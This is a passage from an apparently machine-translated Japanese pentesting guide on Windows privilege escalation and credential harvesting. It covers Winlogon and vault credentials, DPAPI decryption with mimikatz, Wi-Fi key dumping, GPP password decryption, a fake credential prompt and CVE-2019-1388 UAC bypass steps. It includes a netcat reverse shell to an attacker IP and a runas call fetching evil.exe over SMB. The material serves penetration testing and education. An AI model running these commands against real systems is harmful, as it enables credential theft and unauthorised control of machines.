### ルーティングテーブル
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARPテーブル
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### ファイアウォールルール

[**ファイアウォール関連のコマンドについてはこのページを確認してください**](../basic-cmd-for-pentesters.md#firewall) **(ルールのリスト、ルールの作成、オフにする、オフにする...)**

More[ ネットワーク列挙のためのコマンドはこちら](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
バイナリ `bash.exe` は `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` にも見つけることができます。

ルートユーザーを取得すると、任意のポートでリッスンできます（`nc.exe` を使用してポートでリッスンする最初の時に、GUIを通じて `nc` がファイアウォールによって許可されるべきかどうか尋ねられます）。
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
bashを簡単にrootとして起動するには、`--default-user root`を試すことができます。

`WSL`ファイルシステムは、フォルダー`C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`で探索できます。

## Windows資格情報

### Winlogon資格情報
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
**Windows** ボールトは、サーバー、ウェブサイト、および他のプログラムのユーザー資格情報を保存します。**Windows** はユーザーを自動的にログインさせることができます。最初は、ユーザーがFacebookの資格情報、Twitterの資格情報、Gmailの資格情報などを保存し、ブラウザを介して自動的にログインできるように見えるかもしれません。しかし、そうではありません。

Windowsボールトは、**Windows** がユーザーを自動的にログインさせることができる資格情報を保存します。これは、リソース（サーバーまたはウェブサイト）にアクセスするために資格情報が必要な任意の**WindowsアプリケーションがこのCredential Manager** & Windowsボールトを利用し、ユーザーが常にユーザー名とパスワードを入力する代わりに提供された資格情報を使用できることを意味します。

アプリケーションがCredential Managerと相互作用しない限り、特定のリソースの資格情報を使用することは不可能だと思います。したがって、アプリケーションがボールトを利用したい場合は、何らかの方法で**資格情報マネージャーと通信し、そのリソースの資格情報をデフォルトのストレージボールトから要求する必要があります**。

`cmdkey`を使用して、マシン上に保存された資格情報のリストを表示します。
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
次に、保存された資格情報を使用するために `/savecred` オプションを使用して `runas` を実行できます。次の例は、SMB 共有を介してリモートバイナリを呼び出しています。
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
`runas`を提供された資格情報で使用する。
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
注意してください、mimikatz、lazagne、[credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html)、[VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html)、または[Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1)から。

### DPAPI

**データ保護API (DPAPI)** は、データの対称暗号化の方法を提供し、主にWindowsオペレーティングシステム内で非対称秘密鍵の対称暗号化に使用されます。この暗号化は、ユーザーまたはシステムの秘密を利用してエントロピーに大きく寄与します。

**DPAPIは、ユーザーのログイン秘密から導出された対称鍵を通じて鍵の暗号化を可能にします**。システム暗号化が関与するシナリオでは、システムのドメイン認証秘密を利用します。

DPAPIを使用して暗号化されたユーザーRSA鍵は、`%APPDATA%\Microsoft\Protect\{SID}`ディレクトリに保存され、ここで`{SID}`はユーザーの[セキュリティ識別子](https://en.wikipedia.org/wiki/Security_Identifier)を表します。**DPAPI鍵は、ユーザーの秘密鍵を保護するマスター鍵と同じファイルに共存しており**、通常は64バイトのランダムデータで構成されています。（このディレクトリへのアクセスは制限されており、CMDの`dir`コマンドでその内容をリストすることはできませんが、PowerShellを通じてリストすることは可能です）。
```powershell
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
あなたは適切な引数（`/pvk` または `/rpc`）を使用して **mimikatz モジュール** `dpapi::masterkey` を使用してそれを復号化できます。

**マスターパスワードによって保護された資格情報ファイル** は通常、次の場所にあります：
```powershell
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
**mimikatzモジュール** `dpapi::cred` を適切な `/masterkey` と共に使用して復号化できます。\
**メモリ** から **多くのDPAPI** **マスタキー** を `sekurlsa::dpapi` モジュールを使って抽出できます（あなたがルートである場合）。

{% content-ref url="dpapi-extracting-passwords.md" %}
[dpapi-extracting-passwords.md](dpapi-extracting-passwords.md)
{% endcontent-ref %}

### PowerShell資格情報

**PowerShell資格情報** は、暗号化された資格情報を便利に保存する方法として、**スクリプト** および自動化タスクでよく使用されます。資格情報は **DPAPI** を使用して保護されており、通常、作成された同じコンピュータ上の同じユーザーによってのみ復号化できます。

資格情報を含むファイルからPS資格情報を**復号化**するには、次のようにします：
```powershell
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### 保存されたRDP接続

それらは `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
および `HKCU\Software\Microsoft\Terminal Server Client\Servers\` にあります。

### 最近実行されたコマンド
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **リモートデスクトップ資格情報マネージャー**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg`モジュールを適切な`/masterkey`で使用して**任意の.rdgファイルを復号化**します。\
メモリから多くのDPAPIマスタキーをMimikatz `sekurlsa::dpapi`モジュールで**抽出**できます。

### Sticky Notes

人々はしばしばWindowsワークステーションでStickyNotesアプリを使用して**パスワード**やその他の情報を保存しますが、それがデータベースファイルであることに気づいていません。このファイルは`C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`にあり、常に検索して調査する価値があります。

### AppCmd.exe

**AppCmd.exeからパスワードを回復するには、管理者であり、高い整合性レベルで実行する必要があります。**\
**AppCmd.exe**は`%systemroot%\system32\inetsrv\`ディレクトリにあります。\
このファイルが存在する場合、いくつかの**資格情報**が構成されており、**回復**できる可能性があります。

このコードは[**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)から抽出されました：
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` が存在するか確認します。\
インストーラーは **SYSTEM 権限で実行され**、多くは **DLL サイドローディングに脆弱です (情報元: ** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**)。**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## ファイルとレジストリ (資格情報)

### Puttyの資格情報
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH ホストキー
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSHキーのレジストリ内

SSHプライベートキーはレジストリキー`HKCU\Software\OpenSSH\Agent\Keys`内に保存されることがあるため、そこに興味深いものがないか確認する必要があります：
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
そのパス内にエントリが見つかった場合、それはおそらく保存されたSSHキーです。これは暗号化されて保存されていますが、[https://github.com/ropnop/windows\_sshagent\_extract](https://github.com/ropnop/windows_sshagent_extract)を使用して簡単に復号化できます。\
この技術に関する詳細情報はこちら: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

`ssh-agent`サービスが実行されていない場合、自動的に起動するようにするには、次のコマンドを実行します:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
{% hint style="info" %}
この技術はもはや有効ではないようです。いくつかのsshキーを作成し、`ssh-add`で追加し、sshを介してマシンにログインしようとしました。レジストリ HKCU\Software\OpenSSH\Agent\Keys は存在せず、procmonは非対称キー認証中に`dpapi.dll`の使用を特定しませんでした。
{% endhint %}

### 無人ファイル
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
あなたは**metasploit**を使用してこれらのファイルを検索することもできます: _post/windows/gather/enum\_unattend_

例の内容:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM バックアップ
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### クラウド認証情報
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

**SiteList.xml**というファイルを探します。

### Cached GPP Pasword

以前は、グループポリシープリファレンス（GPP）を介して一群のマシンにカスタムローカル管理者アカウントを展開する機能が利用可能でした。しかし、この方法には重大なセキュリティ上の欠陥がありました。まず、SYSVOLにXMLファイルとして保存されているグループポリシーオブジェクト（GPO）は、任意のドメインユーザーによってアクセス可能でした。次に、これらのGPP内のパスワードは、公開文書化されたデフォルトキーを使用してAES256で暗号化されており、認証されたユーザーによって復号化可能でした。これは、ユーザーが特権を昇格させることを可能にするため、深刻なリスクをもたらしました。

このリスクを軽減するために、「cpassword」フィールドが空でないローカルキャッシュされたGPPファイルをスキャンする機能が開発されました。このようなファイルが見つかると、関数はパスワードを復号化し、カスタムPowerShellオブジェクトを返します。このオブジェクトには、GPPに関する詳細とファイルの場所が含まれており、このセキュリティ脆弱性の特定と修正に役立ちます。

これらのファイルを探します：`C:\ProgramData\Microsoft\Group Policy\history` または _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history**（W Vista以前）_ 

* Groups.xml
* Services.xml
* Scheduledtasks.xml
* DataSources.xml
* Printers.xml
* Drives.xml

**cPasswordを復号化するには：**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Using crackmapexec to get the passwords:  
パスワードを取得するための crackmapexec の使用:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
```markdown
credentialsを含むweb.configの例:
```
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPNの資格情報
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### ログ
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Ask for credentials

You can always **ask the user to enter his credentials of even the credentials of a different user** if you think he can know them (notice that **asking** the client directly for the **credentials** is really **risky**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **資格情報を含む可能性のあるファイル名**

以前に**平文**または**Base64**で**パスワード**を含んでいた既知のファイル
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
すべての提案されたファイルを検索します:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBin内の資格情報

資格情報が含まれているかどうかを確認するために、Binもチェックする必要があります。

複数のプログラムによって保存された**パスワードを回復する**には、次のツールを使用できます: [http://www.nirsoft.net/password\_recovery\_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### レジストリ内

**資格情報を含む他の可能性のあるレジストリキー**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**オープンSSHキーをレジストリから抽出する。**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ブラウザの履歴

**ChromeまたはFirefox**からパスワードが保存されているdbを確認する必要があります。\
また、ブラウザの履歴、ブックマーク、お気に入りも確認してください。そこに**パスワードが**保存されているかもしれません。

ブラウザからパスワードを抽出するためのツール：

* Mimikatz: `dpapi::chrome`
* [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
* [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
* [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLLの上書き**

**コンポーネントオブジェクトモデル (COM)** は、異なる言語のソフトウェアコンポーネント間の**相互通信**を可能にするWindowsオペレーティングシステム内に構築された技術です。各COMコンポーネントは**クラスID (CLSID)**によって識別され、各コンポーネントはインターフェースID (IIDs)によって識別される1つ以上のインターフェースを介して機能を公開します。

COMクラスとインターフェースは、それぞれ**HKEY\_**_**CLASSES\_**_**ROOT\CLSID**および**HKEY\_**_**CLASSES\_**_**ROOT\Interface**のレジストリに定義されています。このレジストリは、**HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** = **HKEY\_**_**CLASSES\_**_**ROOT**をマージすることによって作成されます。

このレジストリのCLSID内には、**DLL**を指す**デフォルト値**を含む子レジストリ**InProcServer32**があり、**ThreadingModel**という値が**Apartment**（シングルスレッド）、**Free**（マルチスレッド）、**Both**（シングルまたはマルチ）、または**Neutral**（スレッド中立）である可能性があります。

![](<../../.gitbook/assets/image (729).png>)

基本的に、実行されるDLLのいずれかを**上書きすることができれば**、そのDLLが異なるユーザーによって実行される場合、**特権を昇格**させることができます。

攻撃者がCOMハイジャッキングを永続性メカニズムとしてどのように使用するかを学ぶには、次を確認してください：

{% content-ref url="com-hijacking.md" %}
[com-hijacking.md](com-hijacking.md)
{% endcontent-ref %}

### **ファイルとレジストリ内の一般的なパスワード検索**

**ファイルの内容を検索**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**特定のファイル名を持つファイルを検索する**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**レジストリでキー名とパスワードを検索する**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### パスワードを検索するツール

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **はmsfの** プラグインで、**被害者の内部で資格情報を検索するすべてのmetasploit POSTモジュールを自動的に実行するために作成しました**。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) は、このページに記載されているパスワードを含むすべてのファイルを自動的に検索します。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) は、システムからパスワードを抽出するためのもう一つの優れたツールです。

ツール [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) は、**セッション**、**ユーザー名**、および**パスワード**を検索します。これらは、クリアテキストでデータを保存するいくつかのツール（PuTTY、WinSCP、FileZilla、SuperPuTTY、RDP）によって保存されます。
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

想像してみてください。**SYSTEMとして実行されているプロセスが新しいプロセスを開く** (`OpenProcess()`) **フルアクセスで**。同じプロセスが**低い権限で新しいプロセスを作成する** (`CreateProcess()`) **が、メインプロセスのすべてのオープンハンドルを継承します**。\
その後、**低い権限のプロセスにフルアクセスがある場合**、`OpenProcess()`で作成された**特権プロセスへのオープンハンドルを取得し**、**シェルコードを注入**できます。\
[この例を読んで、**この脆弱性を検出し、悪用する方法についての詳細情報を得てください**。](leaked-handle-exploitation.md)\
[この**別の投稿を読んで、異なる権限レベル（フルアクセスだけでなく）で継承されたプロセスとスレッドのオープンハンドルをテストし、悪用する方法についてのより完全な説明を得てください**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

共有メモリセグメント、いわゆる**パイプ**は、プロセス間の通信とデータ転送を可能にします。

Windowsは**Named Pipes**と呼ばれる機能を提供しており、無関係なプロセスが異なるネットワークを介してもデータを共有できます。これは、**named pipe server**と**named pipe client**として定義された役割を持つクライアント/サーバーアーキテクチャに似ています。

**クライアント**によってパイプを通じてデータが送信されると、パイプを設定した**サーバー**は**クライアントのアイデンティティを引き受ける**能力を持っています。必要な**SeImpersonate**権限がある場合です。パイプを介して通信する**特権プロセス**を特定し、そのプロセスのアイデンティティを模倣する機会があり、あなたが確立したパイプと相互作用する際にそのプロセスのアイデンティティを採用することで**より高い権限を得る**ことができます。このような攻撃を実行するための指示は、[**こちら**](named-pipe-client-impersonation.md)と[**こちら**](./#from-high-integrity-to-system)で見つけることができます。

また、次のツールは、**burpのようなツールでnamed pipe通信を傍受することを可能にします**：[**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **このツールは、特権昇格を見つけるためにすべてのパイプをリストし、表示することを可能にします** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Misc

### **パスワードのためのコマンドラインの監視**

ユーザーとしてシェルを取得すると、**コマンドラインで資格情報を渡す**スケジュールされたタスクや他のプロセスが実行されている可能性があります。以下のスクリプトは、プロセスのコマンドラインを2秒ごとにキャプチャし、現在の状態と前の状態を比較して、違いを出力します。
```powershell
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## プロセスからのパスワードの盗難

## 低特権ユーザーからNT\AUTHORITY SYSTEMへの昇格 (CVE-2019-1388) / UACバイパス

グラフィカルインターフェース（コンソールまたはRDP経由）にアクセスでき、UACが有効になっている場合、Microsoft Windowsの一部のバージョンでは、特権のないユーザーから「NT\AUTHORITY SYSTEM」などのターミナルや他のプロセスを実行することが可能です。

これにより、特権を昇格させ、同時に同じ脆弱性でUACをバイパスすることができます。さらに、何もインストールする必要がなく、プロセス中に使用されるバイナリはMicrosoftによって署名され、発行されています。

影響を受けるシステムの一部は以下の通りです：
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
この脆弱性を悪用するには、次の手順を実行する必要があります：
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
あなたは次のGitHubリポジトリに必要なすべてのファイルと情報を持っています：

https://github.com/jas502n/CVE-2019-1388

## 管理者中から高い整合性レベル / UACバイパスへ

**整合性レベルについて学ぶためにこれを読んでください**：

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

次に、**UACとUACバイパスについて学ぶためにこれを読んでください**：

{% content-ref url="../authentication-credentials-uac-and-efs/uac-user-account-control.md" %}
